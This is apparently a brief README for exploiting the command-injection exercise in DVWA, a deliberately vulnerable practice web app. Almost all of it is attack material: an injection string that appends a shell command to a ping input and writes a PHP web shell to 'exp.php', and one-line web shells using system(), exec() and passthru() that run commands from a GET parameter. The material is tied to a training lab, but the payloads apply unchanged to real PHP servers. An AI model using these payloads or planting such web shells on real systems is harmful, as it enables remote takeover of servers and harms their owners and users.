# Command-Injection - DVWA
Exploit Command Injection

> # IP 
> > type anything just for command "PING"

> # PAYLOAD 
> > this PAYLOAD for type and command and execute in cmd or terminal

> # NAME FILE 
> > name file for payload

### ** You can execute directly without creating the payload


> Enter when the Command-Injection

```cmd
1.1.1.1 & echo "<?php passthru($_GET['excute']); ?> " > exp.php
```

| Func other |
| --- |
| `passthru()` | 
| `system()` |
| `exec()` |

# System
```php
<?php system($_GET['excute']); ?> 
```
# Exec
```php
<?php exec($_GET['excute']); ?> 
```
# Passthru
```php
<?php passthru($_GET['excute']); ?> 
```

> You can use this func replaced "passthru" if had any problem
